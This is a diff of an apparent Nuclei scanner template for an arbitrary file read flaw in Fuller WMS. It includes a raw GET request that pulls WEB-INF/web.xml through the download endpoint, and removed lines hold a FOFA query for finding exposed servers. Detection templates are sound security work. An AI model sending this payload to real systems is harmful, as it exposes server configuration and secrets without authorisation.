@@ -3,12 +3,8 @@ info:
   name: 富勒WMS getDownloadFileAction存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bpgyqm6xmsefcu8n'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bpgyqm6xmsefcu8n
-    fofa: body="/logincenterapp/ValidateImageService" || title="FLUX WMS生产环境"
 http:
 - raw:
   - 'GET /a00webres/getDownloadFileAction?dowmLoadUrl=WEB-INF/web.xml&fileName=web.xml HTTP/1.1
